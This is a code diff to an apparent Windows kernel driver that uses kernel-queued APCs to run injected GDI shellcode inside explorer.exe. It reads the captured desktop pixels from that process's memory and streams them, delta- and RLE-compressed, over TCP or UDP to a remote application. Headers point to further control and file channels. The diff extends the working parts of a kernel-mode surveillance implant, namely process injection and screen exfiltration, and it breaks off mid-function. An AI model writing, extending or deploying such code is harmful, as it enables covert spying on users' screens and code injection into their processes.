@@ -22,12 +22,16 @@ Abstract:
 --*/
 
 #include "ScreenShot.h"
+#include "NetControl.h"
 #include "Wsk.h"
+#include "TcpLink.h"
 #include "Ioctl.h"
 #include "ShellcodeGdiBytes.h"
 #include <ntstrsafe.h>
+#include "../Shared/NdarkLog.h"
+#include "CompatPool.h"
 
-#define LOG(fmt, ...) /* disabled */
+#define LOG(fmt, ...) NDARK_LOG_INFO(fmt, ##__VA_ARGS__)
 #define TAG_SS 'sSnD'
 
 /* ===================================================================
@@ -121,6 +125,15 @@ NTKERNELAPI BOOLEAN KeInsertQueueApc(
     _In_opt_ PVOID    SystemArgument1,
     _In_opt_ PVOID    SystemArgument2,
     _In_     KPRIORITY Increment);
+
+/* KeRemoveQueueApc is NOT statically imported.
+   Reason: it is exported by ntoskrnl.exe starting with Windows 10 build
+   19041 *plus* a later cumulative update; the original 19041.1 RTM does
+   not export it, so any driver that imports it cannot load there
+   (STATUS_ENTRYPOINT_NOT_FOUND / sc start error 127). We resolve it lazily
+   via MmGetSystemRoutineAddress and skip the cancel step gracefully if the
+   running kernel does not provide it. */
+typedef BOOLEAN (NTAPI *PFN_KeRemoveQueueApc)(_Inout_ PKAPC Apc);
 
 /* ===================================================================
    PEB / LDR structures (x64 offsets, stable Win7 .. Win11)
@@ -230,22 +243,30 @@ typedef struct _SPI_THREAD {
 } SPI_THREAD;
 
 static BOOLEAN
-IsDwmName(_In_ PCWSTR buf, _In_ USHORT chars)
+IsTargetName(_In_ PCWSTR buf, _In_ USHORT chars)
 {
-    if (chars != 7) return FALSE;
-    return (buf[0] == L'd' || buf[0] == L'D') &&
-           (buf[1] == L'w' || buf[1] == L'W') &&
-           (buf[2] == L'm' || buf[2] == L'M') &&
-            buf[3] == L'.'  &&
-           (buf[4] == L'e' || buf[4] == L'E') &&
-           (buf[5] == L'x' || buf[5] == L'X') &&
-           (buf[6] == L'e' || buf[6] == L'E');
+    /* Match "explorer.exe" (12 chars) — regular user process that can
+     * see the composited desktop via GDI GetDC(NULL) + BitBlt.
+     * dwm.exe is the compositor itself and returns black from GetDC. */
+    if (chars != 12) return FALSE;
+    return (buf[0] == L'e' || buf[0] == L'E') &&
+           (buf[1] == L'x' || buf[1] == L'X') &&
+           (buf[2] == L'p' || buf[2] == L'P') &&
+           (buf[3] == L'l' || buf[3] == L'L') &&
+           (buf[4] == L'o' || buf[4] == L'O') &&
+           (buf[5] == L'r' || buf[5] == L'R') &&
+           (buf[6] == L'e' || buf[6] == L'E') &&
+           (buf[7] == L'r' || buf[7] == L'R') &&
+            buf[8] == L'.'  &&
+           (buf[9] == L'e' || buf[9] == L'E') &&
+           (buf[10] == L'x' || buf[10] == L'X') &&
+           (buf[11] == L'e' || buf[11] == L'E');
 }
 
 static NTSTATUS
-FindDwmProcess(_Outptr_ PEPROCESS* OutProcess,
-               _Out_writes_(DWM_MAX_THREADS) HANDLE* OutTids,
-               _Out_ ULONG* OutTidCount)
+FindTargetProcess(_Outptr_ PEPROCESS* OutProcess,
+                  _Out_writes_(DWM_MAX_THREADS) HANDLE* OutTids,
+                  _Out_ ULONG* OutTidCount)
 {
     NTSTATUS status;
     ULONG    size = 0;
@@ -271,8 +292,10 @@ FindDwmProcess(_Outptr_ PEPROCESS* OutProcess,
     SPI_ENTRY* p = (SPI_ENTRY*)buf;
     for (;;) {
         if (p->ImageName.Buffer && p->ImageName.Length > 0) {
-            if (IsDwmName(p->ImageName.Buffer,
-                          p->ImageName.Length / sizeof(WCHAR))) {
+            if (IsTargetName(p->ImageName.Buffer,
+                             p->ImageName.Length / sizeof(WCHAR))) {
+                /* Skip session 0 — it has no visible desktop */
+                if (p->SessionId >= 1) {
                 PEPROCESS proc = NULL;
                 if (NT_SUCCESS(PsLookupProcessByProcessId(
                         p->UniqueProcessId, &proc))) {
@@ -292,6 +315,7 @@ FindDwmProcess(_Outptr_ PEPROCESS* OutProcess,
                     }
                     ObDereferenceObject(proc);
                 }
+                } /* SessionId >= 1 */
             }
         }
         if (p->NextEntryOffset == 0) break;
@@ -626,6 +650,105 @@ ReadRemote(_In_ PEPROCESS Proc, _In_ PVOID Src,
                                Len, KernelMode, &n);
 }
 
+typedef struct _SS_APC_CONTEXT {
+    KAPC       Apc;
+    LIST_ENTRY Link;
+    volatile LONG Linked;
+} SS_APC_CONTEXT, *PSS_APC_CONTEXT;
+
+static KSPIN_LOCK g_ApcLock;
+static LIST_ENTRY g_PendingApcs;
+static KEVENT     g_ApcDone;
+static volatile LONG g_ApcInit = 0;
+static volatile LONG g_ApcOutstanding = 0;
+
+static VOID
+ScreenApcInit(VOID)
+{
+    if (InterlockedCompareExchange(&g_ApcInit, 1, 0) == 0) {
+        KeInitializeSpinLock(&g_ApcLock);
+        InitializeListHead(&g_PendingApcs);
+        KeInitializeEvent(&g_ApcDone, NotificationEvent, TRUE);
+    }
+}
+
+static VOID
+ScreenApcLink(_Inout_ PSS_APC_CONTEXT Ctx)
+{
+    KIRQL oldIrql;
+
+    KeAcquireSpinLock(&g_ApcLock, &oldIrql);
+    InsertTailList(&g_PendingApcs, &Ctx->Link);
+    InterlockedExchange(&Ctx->Linked, 1);
+    KeReleaseSpinLock(&g_ApcLock, oldIrql);
+}
+
+static VOID
+ScreenApcUnlink(_Inout_ PSS_APC_CONTEXT Ctx)
+{
+    KIRQL oldIrql;
+
+    KeAcquireSpinLock(&g_ApcLock, &oldIrql);
+    if (InterlockedCompareExchange(&Ctx->Linked, 0, 0) != 0) {
+        RemoveEntryList(&Ctx->Link);
+        InterlockedExchange(&Ctx->Linked, 0);
+    }
+    KeReleaseSpinLock(&g_ApcLock, oldIrql);
+}
+
+static VOID
+ScreenApcRelease(_Inout_ PSS_APC_CONTEXT Ctx)
+{
+    ScreenApcUnlink(Ctx);
+    ExFreePoolWithTag(Ctx, TAG_SS);
+    if (InterlockedDecrement(&g_ApcOutstanding) == 0)
+        KeSetEvent(&g_ApcDone, IO_NO_INCREMENT, FALSE);
+}
+
+static VOID
+ScreenCancelPendingApcs(VOID)
+{
+    ScreenApcInit();
+
+    for (;;) {
+        KIRQL oldIrql;
+        PSS_APC_CONTEXT ctx;
+
+        KeAcquireSpinLock(&g_ApcLock, &oldIrql);
+        if (IsListEmpty(&g_PendingApcs)) {
+            KeReleaseSpinLock(&g_ApcLock, oldIrql);
+            break;
+        }
+        ctx = CONTAINING_RECORD(g_PendingApcs.Flink, SS_APC_CONTEXT, Link);
+        RemoveEntryList(&ctx->Link);
+        InterlockedExchange(&ctx->Linked, 0);
+        KeReleaseSpinLock(&g_ApcLock, oldIrql);
+
+        {
+            static PFN_KeRemoveQueueApc s_pRemoveQueueApc = NULL;
+            static LONG s_resolved = 0;
+            if (InterlockedCompareExchange(&s_resolved, 0, 0) == 0) {
+                UNICODE_STRING name;
+                RtlInitUnicodeString(&name, L"KeRemoveQueueApc");
+                s_pRemoveQueueApc =
+                    (PFN_KeRemoveQueueApc)MmGetSystemRoutineAddress(&name);
+                InterlockedExchange(&s_resolved, 1);
+            }
+            if (s_pRemoveQueueApc) {
+                if (s_pRemoveQueueApc(&ctx->Apc))
+                    ScreenApcRelease(ctx);
+            } else {
+                /* Old kernel: cannot revoke a queued APC. The APC will
+                   eventually fire and ApcKernelRoutine will call
+                   ScreenApcRelease(); we just don't fast-cancel it here. */
+            }
+        }
+    }
+
+    if (InterlockedCompareExchange(&g_ApcOutstanding, 0, 0) > 0)
+        KeWaitForSingleObject(&g_ApcDone, Executive, KernelMode, FALSE, NULL);
+}
+
 /* ===================================================================
    (5)  APC injection
    =================================================================== */
@@ -641,7 +764,13 @@ ApcKernelRoutine(_In_    PKAPC           Apc,
     UNREFERENCED_PARAMETER(NC);
     UNREFERENCED_PARAMETER(SA1);
     UNREFERENCED_PARAMETER(SA2);
-    ExFreePoolWithTag(Apc, TAG_SS);
+    ScreenApcRelease(CONTAINING_RECORD(Apc, SS_APC_CONTEXT, Apc));
+}
+
+static VOID NTAPI
+ApcRundownRoutine(_In_ PKAPC Apc)
+{
+    ScreenApcRelease(CONTAINING_RECORD(Apc, SS_APC_CONTEXT, Apc));
 }
 
 static NTSTATUS
@@ -650,36 +779,82 @@ QueueUserApc(_In_ HANDLE   ThreadId,
              _In_ PVOID    Context)   /* user-mode params addr    */
 {
     PETHREAD thread = NULL;
-    PKAPC    apc;
+    PSS_APC_CONTEXT apcCtx;
     BOOLEAN  ok;
     NTSTATUS st;
 
     st = PsLookupThreadByThreadId(ThreadId, &thread);
     if (!NT_SUCCESS(st) || !thread) return STATUS_NOT_FOUND;
 
-    apc = (PKAPC)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC), TAG_SS);
-    if (!apc) {
+    ScreenApcInit();
+    KeClearEvent(&g_ApcDone);
+    InterlockedIncrement(&g_ApcOutstanding);
+
+    apcCtx = (PSS_APC_CONTEXT)ExAllocatePool2(POOL_FLAG_NON_PAGED,
+                                              sizeof(SS_APC_CONTEXT), TAG_SS);
+    if (!apcCtx) {
+        if (InterlockedDecrement(&g_ApcOutstanding) == 0)
+            KeSetEvent(&g_ApcDone, IO_NO_INCREMENT, FALSE);
         ObDereferenceObject(thread);
         return STATUS_INSUFFICIENT_RESOURCES;
     }
+    RtlZeroMemory(apcCtx, sizeof(*apcCtx));
+    InitializeListHead(&apcCtx->Link);
 
-    KeInitializeApc(apc, thread, OriginalApcEnvironment,
-                    (PVOID)ApcKernelRoutine, NULL /* Rundown */,
+    KeInitializeApc(&apcCtx->Apc, thread, OriginalApcEnvironment,
+                    (PVOID)ApcKernelRoutine, (PVOID)ApcRundownRoutine,
                     (PKNORMAL_ROUTINE)Routine, UserMode, Context);
+    ScreenApcLink(apcCtx);
 
-    ok = KeInsertQueueApc(apc, NULL, NULL, 0);
+    ok = KeInsertQueueApc(&apcCtx->Apc, NULL, NULL, 0);
     ObDereferenceObject(thread);
 
     if (!ok) {
-        ExFreePoolWithTag(apc, TAG_SS);
+        ScreenApcRelease(apcCtx);
         return STATUS_UNSUCCESSFUL;
     }
     return STATUS_SUCCESS;
 }
 
 /* ===================================================================
-   (6)  Frame sender (WSK UDP, NDARK1 protocol)
+   (6)  Frame sender — diff + RLE + binary (V2 protocol)
    =================================================================== */
+
+/* Previous frame for delta encoding */
+static PUCHAR  g_PrevFrame     = NULL;
+static ULONG   g_PrevFrameSize = 0;
+
+/* Concurrency guard: prevent multiple captures running at once */
+static volatile LONG g_ShotBusy = 0;
+
+/* App can request a keyframe when it detects desync */
+volatile LONG g_ForceKeyframe = 0;
+
+/*
+ * RLE-compress a DWORD array.
+ * Format: [count:2B LE][value:4B] × N  (6 bytes per run)
+ * Returns compressed size in bytes, 0 on error.
+ */
+static ULONG
+RleCompressDwords(_In_  const ULONG* Src, _In_ ULONG DwordCount,
+                  _Out_ UCHAR* Dst, _In_ ULONG DstCapacity)
+{
+    ULONG out = 0;
+    ULONG i   = 0;
+
+    while (i < DwordCount) {
+        ULONG val = Src[i];
+        ULONG run = 1;
+        while (i + run < DwordCount && run < 65535 && Src[i + run] == val)
+            run++;
+        if (out + 6 > DstCapacity) return 0;  /* overflow */
+        *(USHORT*)(Dst + out) = (USHORT)run;
+        *(ULONG*)(Dst + out + 2) = val;
+        out += 6;
+        i += run;
+    }
+    return out;
+}
 
 static NTSTATUS
 SendFrame(_In_ ULONG W, _In_ ULONG H,
@@ -693,85 +868,205 @@ SendFrame(_In_ ULONG W, _In_ ULONG H,
     ULONG       chunkSz, chunkCnt, i;
     SIZE_T      sent;
     CHAR        hdr[256];
-    CHAR*       pkt = NULL;
-    static const CHAR kHex[] = "0123456789ABCDEF";
+    UCHAR*      pkt = NULL;
+    BOOLEAN     isKey;
+    PUCHAR      diffBuf  = NULL;
+    PUCHAR      compBuf  = NULL;
+    ULONG       compSize = 0;
+    ULONG       dwordCnt;
 
     fid = (ULONG)InterlockedIncrement(&s_FrameId);
+    dwordCnt = PxLen / 4;
 
-    st = WSK_socket(&sock, AF_INET, SOCK_DGRAM, IPPROTO_UDP,
-                     WSK_FLAG_DATAGRAM_SOCKET);
-    if (!NT_SUCCESS(st)) return st;
+    /* Keyframe if first frame or resolution changed */
+    isKey = (!g_PrevFrame || g_PrevFrameSize != PxLen);
 
-    RtlZeroMemory(&local, sizeof(local));
-    local.sin_family                   = AF_INET;
-    local.sin_addr.S_un.S_un_b.s_b1   = NETDRV_DRIVER_IP_B1;
-    local.sin_addr.S_un.S_un_b.s_b2   = NETDRV_DRIVER_IP_B2;
-    local.sin_addr.S_un.S_un_b.s_b3   = NETDRV_DRIVER_IP_B3;
-    local.sin_addr.S_un.S_un_b.s_b4   = NETDRV_DRIVER_IP_B4;
-    st = WSKBind(sock, (PSOCKADDR)&local);
-    if (!NT_SUCCESS(st)) { WSK_closesocket(sock); return st; }
+    /* Allocate diff buffer */
+    diffBuf = (PUCHAR)ExAllocatePool2(POOL_FLAG_PAGED, PxLen, TAG_SS);
+    if (!diffBuf) return STATUS_INSUFFICIENT_RESOURCES;
 
-    RtlZeroMemory(&peer, sizeof(peer));
-    peer.sin_family                  = AF_INET;
-    peer.sin_port                    = RtlUshortByteSwap(NETDRV_UDP_PORT);
-    peer.sin_addr.S_un.S_un_b.s_b1  = NETDRV_APP_IP_B1;
-    peer.sin_addr.S_un.S_un_b.s_b2  = NETDRV_APP_IP_B2;
-    peer.sin_addr.S_un.S_un_b.s_b3  = NETDRV_APP_IP_B3;
-    peer.sin_addr.S_un.S_un_b.s_b4  = NETDRV_APP_IP_B4;
-
-    chunkSz  = 8192;
-    chunkCnt = (PxLen + chunkSz - 1) / chunkSz;
-
-    /* B|shot| header */
-    RtlStringCbPrintfA(hdr, sizeof(hdr),
-        NETDRV_UDP_PACKET_MAGIC "B|shot|%u|%u|%u|%X|%u|%u\n",
-        fid, W, H, PxLen, chunkSz, chunkCnt);
-    WSKSendTo(sock, hdr, strlen(hdr), &sent, (PSOCKADDR)&peer);
-
-    /* Y| chunks (hex-encoded) */
-    pkt = (CHAR*)ExAllocatePool2(POOL_FLAG_NON_PAGED,
-                                  chunkSz * 2 + 128, TAG_SS);
-    if (pkt) {
-        for (i = 0; i < chunkCnt; i++) {
-            ULONG off = i * chunkSz;
-            ULONG len = (PxLen - off > chunkSz) ? chunkSz : (PxLen - off);
-            CHAR  ph[96];
-            CHAR* dst;
-            ULONG k;
-
-            RtlStringCbPrintfA(ph, sizeof(ph),
-                NETDRV_UDP_PACKET_MAGIC "Y|%u|%u|%X|%X|",
-                fid, i, off, len);
-            {
-                SIZE_T phLen = strlen(ph);
-                RtlCopyMemory(pkt, ph, phLen);
-                dst = pkt + phLen;
-            }
-
-            for (k = 0; k < len; k++) {
-                UCHAR b = Px[off + k];
-                *dst++ = kHex[(b >> 4) & 0xF];
-                *dst++ = kHex[b & 0xF];
-            }
-            *dst++ = '\n';
-
-            WSKSendTo(sock, pkt, (SIZE_T)(dst - pkt),
-                      &sent, (PSOCKADDR)&peer);
-        }
-        ExFreePoolWithTag(pkt, TAG_SS);
+    if (isKey) {
+        RtlCopyMemory(diffBuf, Px, PxLen);
+    } else {
+        /* XOR with previous frame */
+        ULONG* d = (ULONG*)diffBuf;
+        const ULONG* c = (const ULONG*)Px;
+        const ULONG* p = (const ULONG*)g_PrevFrame;
+        for (i = 0; i < dwordCnt; i++)
+            d[i] = c[i] ^ p[i];
     }
 
-    /* E|shot| trailer */
+    /* RLE compress — worst case 6 bytes per DWORD (all unique) */
     {
-        CHAR tr[96];
-        RtlStringCbPrintfA(tr, sizeof(tr),
-            NETDRV_UDP_PACKET_MAGIC "E|shot|%u|%u\n", fid, PxLen);
-        WSKSendTo(sock, tr, strlen(tr), &sent, (PSOCKADDR)&peer);
+        ULONG compCapacity = dwordCnt * 6;
+        compBuf = (PUCHAR)ExAllocatePool2(POOL_FLAG_PAGED, compCapacity, TAG_SS);
+        if (!compBuf) {
+            ExFreePoolWithTag(diffBuf, TAG_SS);
+            return STATUS_INSUFFICIENT_RESOURCES;
+        }
+        compSize = RleCompressDwords((const ULONG*)diffBuf, dwordCnt,
+                                     compBuf, compCapacity);
+    }
+    ExFreePoolWithTag(diffBuf, TAG_SS);
+
+    /* If RLE made it bigger, fall back to keyframe raw binary */
+    if (compSize == 0 || compSize > PxLen) {
+        ExFreePoolWithTag(compBuf, TAG_SS);
+        compBuf = (PUCHAR)ExAllocatePool2(POOL_FLAG_PAGED, PxLen, TAG_SS);
+        if (!compBuf) return STATUS_INSUFFICIENT_RESOURCES;
+        RtlCopyMemory(compBuf, Px, PxLen);
+        compSize = PxLen;
+        isKey = TRUE;  /* force keyframe — no RLE header */
     }
 
-    WSK_closesocket(sock);
+    /* Save current frame as prev */
+    if (!g_PrevFrame || g_PrevFrameSize < PxLen) {
+        if (g_PrevFrame) ExFreePoolWithTag(g_PrevFrame, TAG_SS);
+        g_PrevFrame = (PUCHAR)ExAllocatePool2(POOL_FLAG_PAGED, PxLen, TAG_SS);
+        if (g_PrevFrame) g_PrevFrameSize = PxLen;
+        else             g_PrevFrameSize = 0;
+    }
+    if (g_PrevFrame) RtlCopyMemory(g_PrevFrame, Px, PxLen);
+
+    /* --- Send via TCP (preferred) or UDP (fallback) --- */
+    if (TcpLinkIsScreenConnected() || TcpLinkIsConnected()) {
+        /* TCP screen path: split compressed payload into bounded frames.
+           A single huge TCP frame blocks the channel until it is fully sent;
+           smaller frames keep screen latency predictable and leave room for
+           control/file channels to progress independently. */
+
+        chunkSz  = NETDRV_TCP_SCREEN_CHUNK_BYTES;
+        chunkCnt = (compSize + chunkSz - 1) / chunkSz;
+        if (chunkCnt == 0)
+            chunkCnt = 1;
+
+        /* B|shot2| header */
+        RtlStringCbPrintfA(hdr, sizeof(hdr),
+            "B|shot2|%u|%u|%u|%X|%X|%u|%u|%u\n",
+            fid, W, H, PxLen, compSize, chunkSz, chunkCnt, isKey ? 1 : 0);
+        TcpLinkSendScreenString(hdr);
+
+        st = STATUS_SUCCESS;
+        for (i = 0; i < chunkCnt; ++i) {
+            ULONG offBytes = i * chunkSz;
+            ULONG thisLen = compSize - offBytes;
+            if (thisLen > chunkSz)
+                thisLen = chunkSz;
+
+            pkt = (UCHAR*)ExAllocatePool2(POOL_FLAG_PAGED,
+                                           2 + 16 + thisLen, TAG_SS);
+            if (!pkt) {
+                st = STATUS_INSUFFICIENT_RESOURCES;
+                break;
+            }
+
+            UCHAR* p = pkt;
+            *p++ = 'Z'; *p++ = '|';
+            *(ULONG*)p = fid;      p += 4;
+            *(ULONG*)p = i;        p += 4;
+            *(ULONG*)p = offBytes; p += 4;
+            *(ULONG*)p = thisLen;  p += 4;
+            RtlCopyMemory(p, compBuf + offBytes, thisLen);
+
+            st = TcpLinkSendScreen(pkt, (ULONG)(2 + 16 + thisLen));
+            ExFreePoolWithTag(pkt, TAG_SS);
+            pkt = NULL;
+            if (!NT_SUCCESS(st))
+                break;
+        }
+
+        /* E|shot2| trailer */
+        if (NT_SUCCESS(st)) {
+            CHAR tr[96];
+            RtlStringCbPrintfA(tr, sizeof(tr),
+                "E|shot2|%u|%X\n", fid, compSize);
+            TcpLinkSendScreenString(tr);
+        }
+    } else {
+        /* UDP fallback path (legacy) */
+        st = WSK_socket(&sock, AF_INET, SOCK_DGRAM, IPPROTO_UDP,
+                         WSK_FLAG_DATAGRAM_SOCKET);
+        if (!NT_SUCCESS(st)) { ExFreePoolWithTag(compBuf, TAG_SS); return st; }
+
+        RtlZeroMemory(&local, sizeof(local));
+        local.sin_family                   = AF_INET;
+        local.sin_addr.S_un.S_un_b.s_b1   = NETDRV_DRIVER_IP_B1;
+        local.sin_addr.S_un.S_un_b.s_b2   = NETDRV_DRIVER_IP_B2;
+        local.sin_addr.S_un.S_un_b.s_b3   = NETDRV_DRIVER_IP_B3;
+        local.sin_addr.S_un.S_un_b.s_b4   = NETDRV_DRIVER_IP_B4;
+        st = WSKBind(sock, (PSOCKADDR)&local);
+        if (!NT_SUCCESS(st)) {
+            WSK_closesocket(sock);
+            ExFreePoolWithTag(compBuf, TAG_SS);
+            return st;
+        }
+
+        RtlZeroMemory(&peer, sizeof(peer));
+        peer.sin_family                  = AF_INET;
+        peer.sin_port                    = RtlUshortByteSwap(NETDRV_UDP_PORT);
+        peer.sin_addr.S_un.S_un_b.s_b1  = NETDRV_APP_IP_B1;
+        peer.sin_addr.S_un.S_un_b.s_b2  = NETDRV_APP_IP_B2;
+        peer.sin_addr.S_un.S_un_b.s_b3  = NETDRV_APP_IP_B3;
+        peer.sin_addr.S_un.S_un_b.s_b4  = NETDRV_APP_IP_B4;
+
+        chunkSz  = 8192;
+        chunkCnt = (compSize + chunkSz - 1) / chunkSz;
+
+        /* B|shot2| header (text) */
+        RtlStringCbPrintfA(hdr, sizeof(hdr),
+            NETDRV_UDP_PACKET_MAGIC "B|shot2|%u|%u|%u|%X|%X|%u|%u|%u\n",
+            fid, W, H, PxLen, compSize, chunkSz, chunkCnt, isKey ? 1 : 0);
+        WSKSendTo(sock, hdr, strlen(hdr), &sent, (PSOCKADDR)&peer);
+
+        /* Z| binary chunks */
+#define Z_HDR_SIZE  (NETDRV_UDP_PACKET_MAGIC_LEN + 2 + 16)
+        pkt = (UCHAR*)ExAllocatePool2(POOL_FLAG_NON_PAGED,
+                                       Z_HDR_SIZE + chunkSz, TAG_SS);
+        if (pkt) {
+            LARGE_INTEGER throttleDly;
+            throttleDly.QuadPart = -10000;  /* 1 ms */
+            for (i = 0; i < chunkCnt; i++) {
+                ULONG off = i * chunkSz;
+                ULONG len = (compSize - off > chunkSz) ? chunkSz : (compSize - off);
+                UCHAR* p  = pkt;
+
+                RtlCopyMemory(p, NETDRV_UDP_PACKET_MAGIC, NETDRV_UDP_PACKET_MAGIC_LEN);
+                p += NETDRV_UDP_PACKET_MAGIC_LEN;
+                *p++ = 'Z'; *p++ = '|';
+                *(ULONG*)p = fid;  p += 4;
+                *(ULONG*)p = i;    p += 4;
+                *(ULONG*)p = off;  p += 4;
+                *(ULONG*)p = len;  p += 4;
+                RtlCopyMemory(p, compBuf + off, len);
+
+                WSKSendTo(sock, pkt, (SIZE_T)(Z_HDR_SIZE + len),
+                          &sent, (PSOCKADDR)&peer);
+
+                if (InterlockedCompareExchange(&g_ControlStop, 0, 0) != 0)
+                    break;
+
+                if (chunkCnt > 4 && (i & 31) == 31)
+                    KeDelayExecutionThread(KernelMode, FALSE, &throttleDly);
+            }
+            ExFreePoolWithTag(pkt, TAG_SS);
+        }
+#undef Z_HDR_SIZE
+
+        /* E|shot2| trailer */
+        {
+            CHAR tr[96];
+            RtlStringCbPrintfA(tr, sizeof(tr),
+                NETDRV_UDP_PACKET_MAGIC "E|shot2|%u|%X\n", fid, compSize);
+            WSKSendTo(sock, tr, strlen(tr), &sent, (PSOCKADDR)&peer);
+        }
+
+        WSK_closesocket(sock);
+    }
+
+    ExFreePoolWithTag(compBuf, TAG_SS);
     if ((fid & 63) == 1)
-        LOG("SendFrame: #%u %ux%u %u bytes %u chunks", fid, W, H, PxLen, chunkCnt);
+        LOG("SendFrame: #%u %ux%u raw=%u comp=%u key=%d chunks=%u",
+            fid, W, H, PxLen, compSize, isKey, chunkCnt);
     return STATUS_SUCCESS;
 }
 
@@ -801,8 +1096,8 @@ ScreenEnsureInit(VOID)
     LOG("ScreenInit: one-time setup");
 
     RtlZeroMemory(g_AllTids, sizeof(g_AllTids));
-    st = FindDwmProcess(&g_Dwm, g_AllTids, &g_AllTidCount);
-    if (!NT_SUCCESS(st)) { LOG("ScreenInit: dwm not found 0x%08X", st); return st; }
+    st = FindTargetProcess(&g_Dwm, g_AllTids, &g_AllTidCount);
+    if (!NT_SUCCESS(st)) { LOG("ScreenInit: target process not found 0x%08X", st); return st; }
     LOG("ScreenInit: dwm pid=%u threads=%u",
         (ULONG)(ULONG_PTR)PsGetProcessId(g_Dwm), g_AllTidCount);
 
@@ -849,6 +1144,8 @@ Fail:
 VOID
 NetDrvScreenCleanup(VOID)
 {
+    ScreenCancelPendingApcs();
+    if (g_PrevFrame)    { ExFreePoolWithTag(g_PrevFrame, TAG_SS); g_PrevFrame = NULL; g_PrevFrameSize = 0; }
     if (g_PixelBuf)     { ExFreePoolWithTag(g_PixelBuf, TAG_SS); g_PixelBuf = NULL; }
     if (g_RemoteCode)   { if (g_Dwm) FreeRemote(g_Dwm, g_RemoteCode);   g_RemoteCode = NULL; }
     if (g_RemoteParams) { if (g_Dwm) FreeRemote(g_Dwm, g_RemoteParams); g_RemoteParams = NULL; }
@@ -867,9 +1164,25 @@ NetDrvScreenCapture(VOID)
 
     PAGED_CODE();
 
+    /* Prevent concurrent captures — races on g_PixelBuf/g_PrevFrame
+       cause double-free → BAD_POOL_HEADER (0x19). */
+    if (InterlockedCompareExchange(&g_ShotBusy, 1, 0) != 0)
+        return STATUS_DEVICE_BUSY;
+
     /* ---- lazy init ---- */
     st = ScreenEnsureInit();
-    if (!NT_SUCCESS(st)) return st;
+    if (!NT_SUCCESS(st)) { InterlockedExchange(&g_ShotBusy, 0); return st; }
+
+    /* Force keyframe every 30 frames OR on app request.
+       TCP is reliable so we rarely need keyframes; diff frames
+       are tiny and transmit instantly. */
+    if (g_PrevFrame &&
+        ((g_FrameCount % 30) == 0 ||
+         InterlockedCompareExchange(&g_ForceKeyframe, 0, 1) == 1)) {
+        ExFreePoolWithTag(g_PrevFrame, TAG_SS);
+        g_PrevFrame = NULL;
+        g_PrevFrameSize = 0;
+    }
 
     /* ---- reset Ready flag (just 8 bytes, not the whole 32MB params) ---- */
     {
@@ -886,7 +1199,7 @@ NetDrvScreenCapture(VOID)
     /* ---- queue APC (cached thread first, fallback scan) ---- */
     {
         LARGE_INTEGER dly;
-        dly.QuadPart = -50000;   /* 5 ms */
+        dly.QuadPart = -10000;   /* 1 ms */
 
         if (g_CachedTid) {
             st = QueueUserApc(g_CachedTid, g_RemoteCode, g_RemoteParams);
@@ -897,6 +1210,8 @@ NetDrvScreenCapture(VOID)
                         (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Ready),
                         &ready, sizeof(ready));
                     if (ready) break;
+                    if (InterlockedCompareExchange(&g_ControlStop, 0, 0) != 0)
+                        break;
                     KeDelayExecutionThread(KernelMode, FALSE, &dly);
                 }
             }
@@ -919,6 +1234,8 @@ NetDrvScreenCapture(VOID)
                             (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Ready),
                             &ready, sizeof(ready));
                         if (ready) break;
+                        if (InterlockedCompareExchange(&g_ControlStop, 0, 0) != 0)
+                            break;
                         KeDelayExecutionThread(KernelMode, FALSE, &dly);
                     }
                 }
@@ -933,6 +1250,7 @@ NetDrvScreenCapture(VOID)
             if ((g_FrameCount & 15) == 0)
                 LOG("ScreenCapture: APC timeout (frame %u)", g_FrameCount);
             g_FrameCount++;
+            InterlockedExchange(&g_ShotBusy, 0);
             return STATUS_TIMEOUT;
         }
     }
@@ -944,12 +1262,19 @@ NetDrvScreenCapture(VOID)
 
         RtlZeroMemory(&hdr, sizeof(hdr));
         st = ReadRemote(g_Dwm, g_RemoteParams, &hdr, sizeof(hdr));
-        if (!NT_SUCCESS(st)) { g_FrameCount++; return st; }
-        if (hdr.Status != 0) { g_FrameCount++; return STATUS_UNSUCCESSFUL; }
+        if (!NT_SUCCESS(st)) {
+            /* dwm state may be stale (e.g. resolution change, dwm restart) */
+            NetDrvScreenCleanup();
+            g_FrameCount++;
+            InterlockedExchange(&g_ShotBusy, 0);
+            return st;
+        }
+        if (hdr.Status != 0) { g_FrameCount++; InterlockedExchange(&g_ShotBusy, 0); return STATUS_UNSUCCESSFUL; }
 
         w = hdr.Width; h = hdr.Height; frameSize = hdr.FrameSize;
         if (frameSize == 0 || frameSize > SC_MAX_FRAME) {
             g_FrameCount++;
+            InterlockedExchange(&g_ShotBusy, 0);
             return STATUS_INVALID_BUFFER_SIZE;
         }
 
@@ -957,18 +1282,87 @@ NetDrvScreenCapture(VOID)
         if (g_PixelBufSize < frameSize) {
             if (g_PixelBuf) ExFreePoolWithTag(g_PixelBuf, TAG_SS);
             g_PixelBuf = ExAllocatePool2(POOL_FLAG_PAGED, frameSize, TAG_SS);
-            if (!g_PixelBuf) { g_PixelBufSize = 0; g_FrameCount++; return STATUS_INSUFFICIENT_RESOURCES; }
+            if (!g_PixelBuf) { g_PixelBufSize = 0; g_FrameCount++; InterlockedExchange(&g_ShotBusy, 0); return STATUS_INSUFFICIENT_RESOURCES; }
             g_PixelBufSize = frameSize;
         }
 
         st = ReadRemote(g_Dwm,
                 (PUCHAR)g_RemoteParams + SC_PIXEL_OFFSET,
                 g_PixelBuf, frameSize);
-        if (!NT_SUCCESS(st)) { g_FrameCount++; return st; }
+        if (!NT_SUCCESS(st)) {
+            NetDrvScreenCleanup();
+            g_FrameCount++;
+            InterlockedExchange(&g_ShotBusy, 0);
+            return st;
+        }
+
+        /* DEBUG: check if capture is all-black; if so, paint a test pattern
+         * so we can tell whether V2 pipeline works vs capture is broken. */
+        {
+            ULONG* px32 = (ULONG*)g_PixelBuf;
+            ULONG  nPix = frameSize / 4;
+            BOOLEAN allBlack = TRUE;
+            ULONG   k;
+            for (k = 0; k < nPix && k < 1024; k++) {
+                if (px32[k] != 0) { allBlack = FALSE; break; }
+            }
+            if (allBlack && nPix > 0) {
+                /* Paint gradient test pattern: rows cycle R/G/B */
+                for (k = 0; k < nPix; k++) {
+                    ULONG row = k / w;
+                    ULONG col = k % w;
+                    UCHAR r = (UCHAR)((col * 255) / (w > 1 ? w - 1 : 1));
+                    UCHAR g = (UCHAR)((row * 255) / (h > 1 ? h - 1 : 1));
+                    UCHAR b = 128;
+                    px32[k] = (ULONG)b | ((ULONG)g << 8) | ((ULONG)r << 16) | 0xFF000000u;
+                }
